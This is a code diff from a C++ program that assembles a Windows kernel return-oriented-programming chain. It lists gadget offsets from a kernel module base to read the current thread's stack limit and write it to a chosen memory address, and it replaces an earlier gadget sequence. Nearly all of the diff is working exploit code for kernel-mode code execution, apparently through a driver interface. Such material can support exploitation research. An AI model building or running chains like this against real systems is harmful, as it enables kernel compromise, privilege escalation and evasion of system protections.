@@ -86,25 +86,11 @@ int main()
     KernelStackManager.AddGadget(0x256c4a, "pop rcx; ret;");
     KernelStackManager.AddValue(0x30, "stack limit");
     KernelStackManager.AddGadget(0x28efa4, "add rax, rcx; ret;");
-    // set rsi so we can jump to it next gadget
-    KernelStackManager.AddGadget(0x2005aa, "pop rsi; ret;");
-    KernelStackManager.AddValue(Driver::GetKernelModuleBase() + 0x20043b, "jump address (ret; gadget)");
-    // r13=rax
-    KernelStackManager.AddGadget(0x6aa7c1, "mov r13, rax; mov r14, rax; mov r15, rax; lfence; jmp rsi;");
 
-    // rax = pool allocation
-    //KernelStackManager.AddFunctionCall("ExAllocatePool2", 0x40, 8, 'Thre');
-    KernelStackManager.AddGadget(0x210e10, "pop rax; ret;");
+    // rdx = stack limit store address
+    KernelStackManager.AddGadget(0x3cca89, "pop rdx; ret;");
     KernelStackManager.AddValue((std::uint64_t)StackLimitStoreAddress, "stack limit store address");
 
-    // rdx = pool allocation
-    KernelStackManager.AddGadget(0x604b3d, "mov r8, rax; mov rax, r8; add rsp, 0x28; ret;");
-    KernelStackManager.AddPadding(0x28);
-    KernelStackManager.AddGadget(0x435f24, "mov rdx, rax; cmp r8, rax; ja 0x435f5d; mov eax, 1; add rsp, 0x28; ret;");
-    KernelStackManager.AddPadding(0x28);
-    // rax = addr of stack limit
-    KernelStackManager.AddGadget(0x32e120, "mov rax, r13; add rsp, 0x48; pop r15; pop r13; ret;");
-    KernelStackManager.AddPadding(0x48 + 0x10);
     // dereference rax, so that rax = stack limit
     KernelStackManager.AddGadget(0x25d375, "mov rax, qword ptr [rax]; ret;");
     KernelStackManager.AddGadget(0x202e49, "mov qword ptr [rdx], rax; ret;");
